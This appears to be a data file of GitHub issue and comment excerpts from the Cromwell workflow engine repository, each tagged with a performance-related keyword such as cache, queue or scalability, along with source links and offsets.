Performance,"If this is really about the file copying like the later comments suggest, it's not even really something that google can solve (or at least, they're not going to). the only way around something like this is for us to not to copy all of those files, which is now possible if a user wants to use the reference call cache scheme. We can only issue so many calls per second so if you have oodles of calls to make it'll take time to work through them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/901#issuecomment-323877533:313,cache,cache,313,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/901#issuecomment-323877533,1,['cache'],['cache']
Performance,"If we bump the ""call cache"" check from job-run time up to call-run time, we might be able to enable cool things like:. * We already ran this subworkflow!; * We don't need to store intermediate files for subworkflow tasks!; * We can call cache expression tools!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3420:21,cache,cache,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3420,2,['cache'],['cache']
Performance,"If you run the workflow described in #820 and then run it a second time which will call cache from the first workflow run, Cromwell will become unresponsive for an unknown amount of time (I usually kill Cromwell after a couple of minutes). If the first workflow succeeded completely, this second workflow will try to grab the results from the cache for 95 jobs, each with 2 arrays of outputs with 901 elements in each array. Cromwell becomes unreachable by the swagger page or any APIs.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/832:88,cache,cache,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/832,2,['cache'],['cache']
Performance,Ignore certain parameters and call cache anyways,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604:35,cache,cache,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604,1,['cache'],['cache']
Performance,Implement call cache hash reading,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1232:15,cache,cache,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1232,1,['cache'],['cache']
Performance,Implement call cache result writing,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1231:15,cache,cache,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1231,1,['cache'],['cache']
Performance,Improve ExecutionStore and WEA performance,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2087:31,perform,performance,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2087,1,['perform'],['performance']
Performance,"In a conformance test and the wild we've seen expressions such as:. `$(self.nameroot).idx6$(self.nameext)` seen [here](https://github.com/common-workflow-language/common-workflow-language/blob/3b747ab973fd05b663182fd1b166bcd114d7d569/v1.0/v1.0/search.cwl#L40).; `$(runtime.outdir)/output.vcf.gz` seen in MuTect2.; ; The spec has a couple discrepancies: ; * String interpolation (a.k.a. ""Template literals"") is a feature in ECMAScript 6, whereas the spec designates 5.1 as the supported version.; * String interpolation is performed using braces, and not parens. In other words **it appears as though this is not valid ECMAScript**.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3196:522,perform,performed,522,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3196,1,['perform'],['performed']
Performance,"In a scatter of 20500 shards, we ran a task that basically took in one file input and output a glob of files. We first tried this with a glob where we expected ~900 files to be output and no memory issues were found and everything went relatively smoothly. Because of some outside factors we decided to change this task to instead output ~3000 files in the glob. After about 13000 tasks were processed(Sucess -> Done) we started seeing some slow down that coincided with errors in the logs like the following:. ```; 2016-08-03 03:34:04,971 cromwell-system-akka.actor.default-dispatcher-51 WARN - Caught exception, retrying: Remote host closed connection during handshake; javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:992) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:876,perform,performInitialHandshake,876,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['perform'],['performInitialHandshake']
Performance,"In a sense yes, but it's upstream of it.; Currently if you scatter 10 million wide, Cromwell still creates 10 million EJEAs that are going to ask for a token.; This stops it from even creating EJEAs if it knows they won't be able to run anyway (yet).; To be perfectly honest I just wanted to kinda float the idea as I haven't gotten to precisely measure if it indeed reduces cpu / memory load (I'm strongly guessing yes though since it's less work being done but...).; I wanted to get people's opinion and if it's a no go already I won't bother measuring.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370564846:388,load,load,388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370564846,1,['load'],['load']
Performance,"In at least one example (I have the workflow & broad accessible inputs if someone needs them) the following leads to a cache miss:. Workflow A, Task A: Output is multipart uploaded to S3 and has an etag to match; Workflow A, Task B: Consumes this file as an input. Workflow B, Task A: Cache hit. Copies that file, but receives an md5 etag; Workflow B, Task B: Cache miss - the two etags are now mismatched. It seems highly likely that a solution to this would also solve #4805",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828:119,cache,cache,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828,3,"['Cache', 'cache']","['Cache', 'cache']"
Performance,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:211,concurren,concurrent-job-limit,211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288,1,['concurren'],['concurrent-job-limit']
Performance,"In general, I feel that the DB calls should be used as sparingly as possible to have good scalability. And Miguel may be right here I believe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201069170:90,scalab,scalability,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201069170,1,['scalab'],['scalability']
Performance,"In my FireCloud workflow, call caching is turned on by default. ; <img width=""1153"" alt=""screen shot 2018-06-07 at 8 57 27 am"" src=""https://user-images.githubusercontent.com/10040800/41101026-f1183d66-6a30-11e8-9fc0-75486f87e18f.png"">. and I also just realized that within the same workflow, some early tasks have the cache results recognized (Hit), for example:; <img width=""509"" alt=""screen shot 2018-06-07 at 9 03 24 am"" src=""https://user-images.githubusercontent.com/10040800/41101331-debd6938-6a31-11e8-903a-c6bf9c6e85e6.png"">; However, once it reaches to one task (M2), which splits the job based on scatter count (in my case, it is 50, basically, each subjob will only take care of a fraction of genome), I think the fraction of genome each job takes care of in different runs should be the same because no parameter has changed. But quite unexpectedly, the subjob cant recognize previous run (Miss). for example:; <img width=""905"" alt=""screen shot 2018-06-07 at 9 19 38 am"" src=""https://user-images.githubusercontent.com/10040800/41102077-f3d8fde4-6a33-11e8-8e24-0c13ada5865a.png"">. If I can't copy whatever successfully finished in previous subjobs, i have to start the whole 50 subjobs every time, it will dramatically increase my cost and time and there is no guarantee that new job will finish successfully because of those transient error. . Maybe there is something I am missing to set up call caching correctly, but as a newbie, I can't figure out myself. . Thanks all in advance",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3740#issuecomment-395418531:318,cache,cache,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3740#issuecomment-395418531,1,['cache'],['cache']
Performance,"In order to improve our scalability, performance, and resilience, we would like to be able to demonstrate measurable improvements. This epic lists the performance tests we would like to run as part of this effort, as well as what to measure.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4796:24,scalab,scalability,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4796,3,"['perform', 'scalab']","['performance', 'scalability']"
Performance,"In terms of demonstrating concurrency, I'd be happy with having the code currently in the `CheckExecutionStatus` handler log the calls it thinks are runnable and having the test scrape the logs to validate correctness. Initially this should be just `ps`, subsequently it should be both `cgrep` and `wc` **at the same time**. I don't care if `cgrep` and `wc` actually run at the same time, I just care that this logic realizes they both become runnable at the same time. Making these things actually run concurrently would likely be fairly involved, especially given my currently weak Akka TestKit-fu.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103239297:26,concurren,concurrency,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103239297,2,['concurren'],"['concurrency', 'concurrently']"
Performance,"In the latest releases of Cromwell (28+), the tmpDir variable is set to be created under the [current working directory of the workflow task](https://github.com/broadinstitute/cromwell/blob/master/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L186) by default. In a cluster environment, we have observed that this limits how quickly a task can execute when using a shared file system (NFS/Lustre/etc.) because these filesystems perform poorly with small reads and writes. In earlier versions of Cromwell, we worked around this by setting tmpDir within each task of the WDL to a path mounted on a local disk, but now the tmpDir variable seems to be set globally resulting in the local tmpDir variable getting overwritten. . We can modify the tmpDir path in StandardAsyncExecutionActor, but this requires recompiling Cromwell for each environment where Cromwell is deployed. Would it be possible to make the tmpDir variable configurable within reference.conf? That way a site admin can deploy Cromwell without needing to recompile, and quickly choose the tmpDir path that is optimal for their environment.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2655:465,perform,perform,465,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2655,1,['perform'],['perform']
Performance,"In theory it shouldn't make a difference.* Cromwell isn't scheduling anything, it's merely seeing what is runnable and launching it. Thus the time delta should be miniscule. However, in the real world there are things such as quotas on the backend and that could make a difference, yes. But keep in mind that backends will themselves process job requests differently and aren't necessarily going to honor the order we send them in anyways. Thus, in my opinion this sort of general optimization is going to be folly as we can never guarantee the underlying behavior anyways. To your primary point, I get what you're saying although my experience has been that every time someone has stated that a behavior should be X as it matches the real world I find someone telling me that the opposite behavior matches the real world. :) This is one of those cases. This one is more complex in that we also hear differing opinions on the whole workflow level (ie should workflows be processed as many at once as possible or optimizing for throughput for any individual workflow). At the end of the day the limiting factor is going to be the backend set up and whatever quotas are in place. * Yes, there is a global job limit but this can be tweaked as high as one would like, so effectively not an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2736#issuecomment-336137269:481,optimiz,optimization,481,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2736#issuecomment-336137269,3,"['optimiz', 'throughput']","['optimization', 'optimizing', 'throughput']"
Performance,"Incidental finding, no immediate action required:. > The Performance Schema tables are intended to replace the INFORMATION_SCHEMA tables, which are deprecated as of MySQL 5.7.6 and are removed in MySQL 8.0. . https://dev.mysql.com/doc/refman/5.7/en/upgrading-from-previous-series.html. It looks like the new performance schema is available on 5.6 but is not enabled on our prod config (requires flag)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153:57,Perform,Performance,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153,2,"['Perform', 'perform']","['Performance', 'performance']"
Performance,Increase gauge processing throughput,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3404:26,throughput,throughput,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3404,1,['throughput'],['throughput']
Performance,"Input caching feature of cromwell is unreliable and does not work with many tools, in particular salmon.; To reproduce it, you can take my quantification WDL pipeline ( https://github.com/antonkulaga/rna-seq/tree/master/pipelines/quantification ), for instance quant_sample ( https://github.com/antonkulaga/rna-seq/blob/master/pipelines/quantification/quant_sample.wdl ) with its dependencies ( https://github.com/antonkulaga/rna-seq/blob/master/pipelines/quantification/quant_run.wdl and https://github.com/antonkulaga/rna-seq/blob/master/pipelines/quantification/extract_run.wdl ) and the any input, for instance:; ```; {; ""quant_sample.experiment"": ""GSM2740704"",; ""quant_sample.salmon_max_memory"": 26,; ""quant_sample.salmon_threads"": 4,; ""quant_sample.key"": ""0a1d74f32382b8a154acacc3a024bdce3709"",; ""quant_sample.samples_folder"": ""/data/samples/EMBED"",; ""quant_sample.salmon_indexes"" : {; ""Homo sapiens"" : ""/data/indexes/salmon/1.3.0/ensembl_101/Homo_sapiens/GRCh38.p13_ensembl_101"",; },; ""quant_sample.transcripts2genes"" : {; ""Homo sapiens"" : ""/data/ensembl/101/species/Homo_sapiens/Homo_sapiens.GRCh38.101.gtf""; }; }; ```; Note: gtf -is regular Human ensemble gtf http://ftp.ensembl.org/pub/release-101/gtf/homo_sapiens/, while salmon index is build from ensemble human genome+transcriptome with https://github.com/antonkulaga/rna-seq/blob/master/pipelines/quantification/quant_index/quant_index.wdl. In all cases when I run local backend (OS is linux) it never caches salmon task properly and reruns it all the time, despite the files are the same.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6143:1467,cache,caches,1467,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6143,1,['cache'],['caches']
Performance,"Inspired by hog groups and recent production conflagrations, allow for workflows to share a blacklist call cache as specified by a workflow option.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5512:107,cache,cache,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5512,1,['cache'],['cache']
Performance,"Instead of adding the MetaInfoId as a part of the Cache Hit Metadata, add the source worklow id, call name and job index using the Fetch Cached Results Actor.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1447:50,Cache,Cache,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1447,2,['Cache'],"['Cache', 'Cached']"
Performance,Instead of creating a future in the actor could you create a separate actor which would perform the blocking operation and pass it back?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1640#issuecomment-257681928:88,perform,perform,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1640#issuecomment-257681928,1,['perform'],['perform']
Performance,"Invalidate Bad Caches ""File not found""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1929:15,Cache,Caches,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1929,1,['Cache'],['Caches']
Performance,Invalidate Call cache results for workflow submitted to DELETE endpoint,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4630:16,cache,cache,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4630,1,['cache'],['cache']
Performance,Invalidate cache after some time,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5174:11,cache,cache,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5174,1,['cache'],['cache']
Performance,Invalidate calls that fail to be use as a call cache for future cache lookups.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1510:47,cache,cache,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1510,2,['cache'],['cache']
Performance,Is call-cache unavailable if you use the Singularity image file?. Is there a solution? How do I configure it?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047358094:8,cache,cache,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047358094,1,['cache'],['cache']
Performance,"Is there an example of how to set call caching to true and allowResultReuse to true in the `-o options` file when running a workflow. I am looking for examples and the documentation and I just keep guessing. Both ways of setting outside of `callCaching` and inside still have my `-m metadata` file showing below:; ```. ""callCaching"": {; ""allowResultReuse"": false,; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. options.json file:; ```; {; 	""default_runtime_attributes"": {; 		""write_to_cache"": true,; 		""read_from_cache"": true,; 		""system.file-hash-cache"": true,; 		""allowResultReuse"" : true,; 		""callCaching"": {; 			""hit"": false,; 			""effectiveCallCachingMode"": ""ReadAndWriteCache"",; 			""result"": ""Cache Miss"",; 			""allowResultReuse"": true; 		}; 	}; }; ```. EDIT:; This only worked by creating a config file with lines:; ```; call-caching {; enabled = true; }; ```; If this is required, shouldn't this documentation [page](https://cromwell.readthedocs.io/en/stable/wf_options/Overview/) include that information under section ""Call Caching Options""?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5246#issuecomment-773541913:557,cache,cache,557,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5246#issuecomment-773541913,2,"['Cache', 'cache']","['Cache', 'cache']"
Performance,Is this the SFS version of invalidate cache results? Can we also update the centaur test `invalidate_bad_caches` to include whatever causes this?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1999#issuecomment-280664752:38,cache,cache,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1999#issuecomment-280664752,1,['cache'],['cache']
Performance,Is upping `queueSize` the answer here?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-297416609:11,queue,queueSize,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-297416609,1,['queue'],['queueSize']
Performance,"Issue was resolved and issue was due to launch template of EC2 and It; should be launched with ssm agent installed on it .; Better option is to use Amazon genomics cli . When you deploy a Context agc; will create batch queues and s3 for you . It's better to use that queue and; s3 in cromwell cofig .; It works better. Regards,; Divya. On Fri, Apr 8, 2022 at 3:13 AM thousand-petalled ***@***.***>; wrote:. > Hey @DivyaThottappilly <https://github.com/DivyaThottappilly> do you; > still have this issue? I'm trying to get up and running a basic Hello World; > but keeps getting an S3Exception null error (301).; >; > It seems like you've already past that stage and if you don't mind, could; > you help me setup this?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1092523379>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AGA4NTQVWHYKZC7RLKGT4OTVD7MCNANCNFSM5N3DE7QQ>; > .; > You are receiving this because you were mentioned.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127:219,queue,queues,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127,2,['queue'],"['queue', 'queues']"
Performance,"Issue: Currently, regardless of the duplication strategy in JES, the call cache placeholder file is created in case of cache hits. . Fix: Added a statement that confirms the caching strategy is set to reference in order to upload the call_caching_placeholder.txt.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2601:74,cache,cache,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2601,2,['cache'],['cache']
Performance,"Issues addressed:. - ~~Custom-named stdout or stderr files were not being delocalized.~~ Handled in #3695 instead; - ~~The wrong stdout and stderr files were being delocalized (user action instead of user command).~~ Handled in #3695 instead; - ~~Optional output files that were not produced were being published to metadata as if they had been produced.~~ Revert fixes for this due to existence check performance issues; - Existence check for optional files was a `-a` test not actually supported by the delocalization Docker's `/bin/sh`. This failed with a zero error code and only minor noise to stderr.; - ~~The fallback non-link chasing symlink that fails noisily for `cwl.output.json` and other no-match globs should now fail silently.~~ Reverted by reviewer request.; - The output manipulator didn't handle cases of > 1 type (optionals, coproducts) correctly in most cases. This is only a partial fix since it turned out not to be required for this test.; - Several non-WDL classes were found in a `wdl` package. Now correctly moved thanks to reviewer input. 🙂 ; - The `read_tsv` Centaur test was falsely claiming success when the files referenced in the generated TSV were never delocalized from the VM to their stated cloud locations. With the existence checks removed from Cromwell proper this has reverted back to ""failing to fail"" which is mistaken for success.; - File literals now actually create a file, needed because the OutputManipulator does existence checks on outputs.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3682:402,perform,performance,402,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3682,1,['perform'],['performance']
Performance,"It appears that when a call cache hits on PAPIv1, the `stdout` and `stderr` links in the metadata are incorrect.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4622:28,cache,cache,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4622,1,['cache'],['cache']
Performance,"It can run the task without having its hash, it just won't try to call cache it nor write it to the cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808:71,cache,cache,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808,2,['cache'],['cache']
Performance,It may be worth setting the queue size to something huge or even unlimited as a stop gap measure. In the settings conf file set put in database -> db `queueSize = -1`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2381#issuecomment-311529864:28,queue,queue,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2381#issuecomment-311529864,2,['queue'],"['queue', 'queueSize']"
Performance,"It seems likely that the size optimization was made independent of knowing how completely and utterly borked Cromwell becomes (unable to run WDLs!), so I still feel that a pass of PO input is valuable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-480395219:30,optimiz,optimization,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-480395219,1,['optimiz'],['optimization']
Performance,It seems that @TMiguelT has already addressed part of [this issue](https://github.com/hpcng/singularity/issues/2597). . The singularity cache is not meant as a replacement for storing your images. It is merely meant as a way to avoid downloading too much. . It seems we have to hack something together in bash or contribute something upstream. I think bash hacking can be fairly succesful but it will be very ugly. The requirements for the cache:; * Make use of singularity's layer cache to avoid too much downloading.; * Should be thread safe. Singularity 3.6.0 commands will use a threadsafe cache. Older version will have to use a universal file lock.; * Will put all `.sif` images in a single shared location.; * Will check if a file exists before pulling. This will mean a cache-first approach. Internet outages should not affect workflows that have already run several times.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631402844:136,cache,cache,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631402844,5,['cache'],"['cache', 'cache-first']"
Performance,"It seems that the HealthMonitor relies on a specific type of response from Pipelines API v2 to determine health of the sub-services. The PAPI response about operation metadata is different between v1 and v2, and the HealthMonitor expectations are tied to the type of response returned from v1. This essentially prevents one from running a HealthMonitor against the v2 backend --which is going to be a requirement of enabling Pipelines API v2 in FireCloud production. AC: Be able to perform HealthMonitoring on both the PAPI v1 and PAPI v2 google backend. Testing criteria: Enable HealthMonitoring for PAPI v1 and PAPI v2 centaur tests.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4029:482,perform,perform,482,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4029,1,['perform'],['perform']
Performance,"It seems to me that callCaching is not working when a task takes a Directory as input. Take the following example WDL:; ```; version development. workflow main {; call task1 { input: s = ""file"" }; call task2 { input: d = task1.d }; output { String s = task2.s }; }. task task1 {; input {; String s; }. command <<<; set -euo pipefail; mkdir dir; touch ""dir/~{s}""; >>>. output {; Directory d = ""dir""; }. runtime {; docker: ""debian:stable-slim""; }; }. task task2 {; input {; Directory d; }. command <<<; set -euo pipefail; ls ""~{d}""; >>>. output {; String s = read_string(stdout()); }. runtime {; docker: ""debian:stable-slim""; }; }; ```. On a first `141477ef-e8e6-4fb9-ae58-5c2e8a646088` run, callCaching for `task2` is negative, as it should, with this error:; ```; ""callCaching"": {; ""hashFailures"": [; {; ""causedBy"": [; {; ""message"": ""gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir"",; ""causedBy"": []; }; ],; ""message"": ""[Attempted 1 time(s)] - FileNotFoundException: gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir""; }; ],; ""allowResultReuse"": false,; ""hit"": false,; ""result"": ""Cache Miss"",; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. Now though, the directory has been created as a result of the WDL succeeding:; ```; $ gsutil ls gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir; gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir/file; ```. On a second `2690f8a5-4cd4-45e2-a93a-55125a1107f8` run, callCaching for `task2` is negative again though, with this error:; ```; ""callCaching"": {; ""hashFailures"": [; {; ""causedBy"": [; {; ""message"": ""gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir"",; ""causedBy"": []; }; ],; ""message"": ""[Attempted 1 time(s)] - FileNotFoundException: gs://my-bucket/cromwell-executions/main/141477ef-e8e6-4fb9-ae58-5c2e8a646088/call-task1/dir""; }; ]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6509:1166,Cache,Cache,1166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509,1,['Cache'],['Cache']
Performance,"It would be easier to consume errors if they were wrapped in JSON. I believe 400 errors are already represented this way already, but a 500 response timeout returns with Content-Type:`text/plain`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/947:140,response time,response timeout,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/947,1,['response time'],['response timeout']
Performance,It would be great to bring over the optional localization feature from the google backend: https://cromwell.readthedocs.io/en/develop/optimizations/FileLocalization/#the-localization_optional-optimization,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3787:134,optimiz,optimizations,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3787,2,['optimiz'],"['optimization', 'optimizations']"
